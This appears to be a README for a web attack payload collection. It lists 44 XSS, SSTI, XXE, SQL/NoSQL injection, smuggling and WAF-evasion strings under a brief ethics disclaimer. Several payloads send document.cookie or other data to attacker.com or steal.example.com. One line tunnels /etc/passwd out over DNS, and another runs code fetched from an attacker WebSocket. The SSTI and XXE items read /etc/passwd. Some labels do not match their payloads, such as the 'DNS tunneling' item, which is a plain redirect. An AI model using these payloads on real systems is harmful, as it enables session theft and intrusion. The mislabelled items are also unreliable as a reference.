# Advanced Payloads Collection

This repository contains a comprehensive collection of advanced payloads designed to test various vulnerabilities in web applications, APIs, and servers. Each payload is crafted to bypass common security filters, WAFs, and evade detection. **These payloads are strictly for educational and ethical testing purposes.**

## ⚠️ Disclaimer

**Use these payloads responsibly. Unauthorized usage on systems you do not own or have explicit permission to test is illegal and unethical.**

---

### Payload Collection

Here are some sample payloads organized by type.

```html
1. **Obfuscation Techniques**
   <script>eval(String.fromCharCode(97, 108, 101, 114, 116))</script>

2. **Header-based Attacks**
   Referer: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>

3. **JavaScript Obfuscation (XSS)**
   <script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

4. **Base64 Encoded Payload**
   <script>eval(atob('YWxlcnQoIkhBQ0tFRCIp'))</script>

5. **Time-based Payload (Delayed Execution)**
   <script>setTimeout(function(){alert('XSS');}, 5000);</script>

6. **HTML Entity Encoding (Bypass Filters)**
   <svg/onload=alert&#40;'XSS'&#41;>

7. **Polyglot Payload (MIME Confusion)**
   <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA..."><script>alert('XSS')</script>

8. **HTTP Parameter Pollution**
   GET /search?term=<script>alert(1)</script>&term=<b>safe</b>

9. **CSP Bypass (Weak Content Security Policy)**
   <img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnQ1NQIGJ5cGFzc2VkIScpOzwvc2NyaXB0Pg==">

10. **DNS Tunneling Payload (Exfiltration via DNS)**
    <script>document.location = "http://steal.example.com/" + document.cookie;</script>

11. **Header Smuggling (Bypass WAF)**
    X-Forwarded-For: <script>alert('XSS')</script>

12. **CSS Injection (Non-JS Based)**
    <div style="background:url('http://attacker.com/steal?' + document.cookie)">

13. **SSRF with XSS Chaining**
    Referer: <script>window.location.href="http://attacker.com/" + document.cookie</script>

14. **Mutation-based Payloads**
    <script> var x = 'al' + 'ert'; window[x]('Bypassing Filter'); </script>

15. **Server-Side Template Injection (SSTI)**
    {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}

16. **Mutation XSS (Non-standard Encoding)**
    <script>%u0061%u006C%u0065%u0072%u0074('Bypass');</script>

17. **Event Handler Obfuscation**
    <svg onload='window["al"+"ert"]("XSS")'></svg>

18. **Logic Flaws in Regex Filters**
    <img src=x onerror="alert('XSS')" </img> >

19. **Mutation XSS with SVG Injections**
    <svg xmlns="http://www.w3.org/2000/svg"> <script>alert('XSS via SVG')</script> </svg>

20. **HTTP Response Smuggling via Malformed Headers**
    GET / HTTP/1.1
    Host: target.com
    Content-Length: 5
    HTTP/1.1 200 OK
    Content-Length: 0
    Connection: close
    <script>alert('XSS')</script>

21. **Blind XXE (XML External Entity)**
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <root> <test>&xxe;</test> </root>

22. **JSON Injection via Prototype Pollution**
    { "__proto__": { "polluted": true, "toString": "alert('Prototype Pollution')" } }

23. **Invisible IFrame Clickjacking**
    <iframe src="http://target.com/login" style="opacity:0;position:absolute;width:100%;height:100%;top:0;left:0;"></iframe>

24. **JSONP Hijacking**
    <script> function exfiltrate(data) { var img = new Image(); img.src = "http://attacker.com/steal?data=" + JSON.stringify(data); } </script>
    <script src="http://vulnerable.com/jsonp?callback=exfiltrate"></script>

25. **Covert DNS Channel (DNS Tunneling)**
    nslookup $(cat /etc/passwd | base64) attacker.com

26. **HTML Polyglot Payloads**
    <?php echo '<scr'.'ipt>alert(1)</scr'.'ipt>'; ?>

27. **Cache Poisoning via Host Header Injection**
    GET / HTTP/1.1
    Host: attacker.com
    X-Forwarded-Host: victim.com

28. **Unicode-based Homograph Attack**
    <a href="http://xn--gogle-7k1e.com">Google</a>

29. **Buried Payloads in WebSocket Traffic**
    var ws = new WebSocket('ws://attacker.com'); ws.onmessage = function(e) { eval(e.data); }

30. **Obfuscated Encoding (Uncommon Character Sets)**
    +ADw-script+AD4-alert(1)+ADw-/script+AD4-

31. **Advanced SQL Injection Payload Bypassing WAF**
    SELECT /*!32302 1*/ FROM users WHERE username='admin' /* and password LIKE '%a%' */ -- -

32. **Case-Sensitivity and Concatenation for XSS Evasion**
    <ImG SrC=1 OnErRoR=prompt(document.cookie)>

33. **Polyglot XSS Payload (Advanced Obfuscation)**
    "><img src=x onerror=confirm``>

34. **NoSQL Injection Bypass (MongoDB)**
    {"$ne": null, "$where": "this.password.match(/.*/)"}

35. **XSS Payload Using HTML Entity Encoding**
    <svg/onload=&Tab;javascript:alert&lpar;1&rpar;>

36. **SQL Injection with Time-Based Blind Injection**
    '; IF(1=1, SLEEP(5), 0); -- -

37. **HTTP Parameter Pollution (HPP) for WAF Bypass**
    GET /index.php?id=1&id=2&id=<script>alert(1)</script>

38. **Unicode Encoded Payload (XSS Evasion)**
    \u003Cimg src=x onerror=alert(1)\u003E

39. **Nested Encoded Payload (Double Base64 Encoding)**
    <img src=x onerror=eval(atob(atob("YWxlcnQoMik=")))>

40. **Split Payload Injection**
    Referer: <script> Referer: alert(1) Referer: </script>

41. **Time-Based Execution to Evade WAF (Advanced XSS)**
    <img src="x" onerror="setTimeout(function(){alert(1)}, 5000)">

42. **Chained Contextual Escaping (Context-Aware Payloads)**
    "><input/onmouseover=eval(unescape(/%61%6C%65%72%74%28%31%29/.source)) autofocus>

43. **Second-Order Attack Payloads (WAF Bypass via Application Logic)**
    <script>document.write("<img src='x' onerror='alert(1)'>")</script>

44. **WAF Evasion via URL Encoding and Multi-Stage Decoding**
    %253Cscript%253Ealert%25281%2529%253C/script%253E
